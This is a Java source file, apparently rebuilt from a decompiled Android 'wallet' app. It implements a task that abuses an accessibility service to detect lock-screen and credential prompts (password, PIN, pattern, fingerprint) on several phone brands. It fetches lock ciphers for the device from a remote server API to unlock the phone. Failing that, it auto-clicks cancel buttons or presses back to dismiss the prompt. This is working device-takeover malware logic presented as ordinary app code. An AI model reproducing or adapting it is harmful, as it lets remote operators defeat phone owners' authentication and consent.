/**
 * 设备凭证调度任务 — UseDeviceCredentialDelegate 的 2 个 case 分发。
 *
 * vendor 原始类: o/f0.java (179 行)
 * 2 cases:
 *   case 0: 凭证验证工作流（API 调用 + 本地密码检查）
 *   default: 辅助凭证取消（点击取消按钮）
 */
package com.guard.wallet.delegate.task;

import android.util.Log;
import com.google.gson.JsonObject;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

public final class DeviceCredentialTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to OPPO UseDeviceCredentialDelegate (g0) */
    public final com.guard.wallet.delegate.UseDeviceCredentialDelegate b;

    public DeviceCredentialTask(com.guard.wallet.delegate.UseDeviceCredentialDelegate g0Var, int caseId) {
        this.a = caseId;
        this.b = g0Var;
    }

    @Override
    public final void run() {
        int caseId = this.a;
        com.guard.wallet.delegate.UseDeviceCredentialDelegate delegate = this.b;

        switch (caseId) {
            case 0:
                handleCredentialVerification(delegate);
                return;

            default:
                /* Assist credential: find cancel button and click it */
                UiObject cancelBtn = delegate.k().findOneByCombine(com.guard.wallet.delegate.UseDeviceCredentialDelegate.H());
                if (cancelBtn != null && cancelBtn.click()) {
                    Log.d("UseDeviceCredentialDelegate", "inAssistCredential Cancel Success");
                }
                delegate.o.remove("inUseDeviceCredential");
        }
    }

    /**
     * Case 0: Full credential verification workflow.
     * 1. Detect if we're in a credential verification window (password/PIN/pattern/fingerprint)
     * 2. If yes, try local cipher API call to unlock
     * 3. If unlock fails, try clicking close buttons
     * 4. As last resort, press back until window closes
     */
    private void handleCredentialVerification(com.guard.wallet.delegate.UseDeviceCredentialDelegate delegate) {
        delegate.getClass();

        /* Detect if in verify credential window */
        boolean inVerifyWindow;
        label_detect: {
            if (MyAccessibilityService.P() != null && delegate.k() != null) {
                /* Check for password field via accessibility node */
                UiObject accessRoot = MyAccessibilityService.P().J();
                if (accessRoot != null && accessRoot.password()) {
                    inVerifyWindow = true;
                    break label_detect;
                }

                /* Check for EditText */
                UiObject root = delegate.k();
                CombineFilter editFilter = new CombineFilter();
                /* ADAPT: inlined a.a.c() to avoid field 'a' shadowing package 'a' */
                editFilter.setStringConditions(new java.util.LinkedList<>());
                StringCondition classCond = new StringCondition();
                classCond.setProperty("className");
                classCond.setEquals("android.widget.EditText");
                editFilter.getStringConditions().add(classCond);
                if (root.findOneByCombine(editFilter) != null) {
                    inVerifyWindow = true;
                    break label_detect;
                }

                /* Check for password input via OR filters */
                if (delegate.k().findOneByOperateOr(com.guard.wallet.delegate.UseDeviceCredentialDelegate.U()) != null) {
                    inVerifyWindow = true;
                    break label_detect;
                }

                /* Check for MIUI PIN pad */
                if (com.guard.wallet.utils.DeviceUtils.isOppoFamily() && delegate.k().findOneByCombine(com.guard.wallet.delegate.UseDeviceCredentialDelegate.W("0")) != null) {
                    inVerifyWindow = true;
                    break label_detect;
                }

                /* Check for pattern view (Huawei/Samsung) */
                if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()
                        && (delegate.k().findOneByCombine(com.guard.wallet.delegate.UseDeviceCredentialDelegate.Z()) != null
                            || delegate.k().findOneByCombine(com.guard.wallet.delegate.UseDeviceCredentialDelegate.Y()) != null)) {
                    inVerifyWindow = true;
                    break label_detect;
                }

                /* Check for fingerprint icon */
                if (delegate.k().findOneByCombine(com.guard.wallet.delegate.UseDeviceCredentialDelegate.L()) != null) {
                    inVerifyWindow = true;
                    break label_detect;
                }
            }
            inVerifyWindow = false;
        }

        ConcurrentLinkedQueue queue = delegate.o;
        String logMsg;

        label_process: {
            label_confirmed: {
                if (inVerifyWindow) {
                    /* First check if already confirmed by local cipher */
                    if (delegate.O() || delegate.N()) {
                        break label_confirmed;
                    }

                    /* Call server API to get lock ciphers */
                    JsonObject response = com.guard.wallet.http.HttpApiManager.syncGetRequest(
                            new ReqDefaultBodyVO(com.guard.wallet.utils.SharedPrefsManager.l("deviceId")),
                            com.guard.wallet.http.HttpApiManager.apiBaseUrl, "/api/cipher/lockCiphers");

                    if (response != null) {
                        com.guard.wallet.helper.DialogHelper.a(response.toString());
                        if (delegate.O() || delegate.N()) {
                            break label_confirmed;
                        }
                    }
                } else {
                    Log.d("UseDeviceCredentialDelegate", "not inVerifyCredentialWindow");
                }

                /* Try clicking close/cancel buttons up to 10 times */
                AtomicInteger closeCounter = new AtomicInteger(0);
                while (closeCounter.incrementAndGet() <= 10) {
                    UiObject closeRoot = delegate.k();
                    CombineFiltersWithOr closeFilters = new CombineFiltersWithOr();
                    closeFilters.setFilters(new LinkedList<>());
                    closeFilters.getFilters().add(com.guard.wallet.delegate.UseDeviceCredentialDelegate.J());
                    closeFilters.getFilters().add(com.guard.wallet.delegate.UseDeviceCredentialDelegate.I());
                    closeFilters.getFilters().add(com.guard.wallet.delegate.UseDeviceCredentialDelegate.H());
                    UiObject closeBtn = closeRoot.findOneByOperateOr(closeFilters);
                    if (closeBtn != null && closeBtn.click()) {
                        logMsg = "closeButton click Success";
                        break label_process;
                    }
                    com.guard.wallet.utils.SystemHelper.T0(2);
                    MyAccessibilityService.I(delegate.k());
                }

                /* Last resort: press back until window closes */
                while (!delegate.K()) {
                    com.guard.wallet.utils.SystemHelper.F0(1);
                    com.guard.wallet.utils.SystemHelper.T0(5);
                    Log.d("UseDeviceCredentialDelegate", "back Success");
                }

                logMsg = "finish inUseDeviceCredential";
                break label_process;
            }

            logMsg = "confirmByLocalCipherLocked Success";
        }

        Log.d("UseDeviceCredentialDelegate", logMsg);
        queue.remove("inUseDeviceCredential");
    }
}
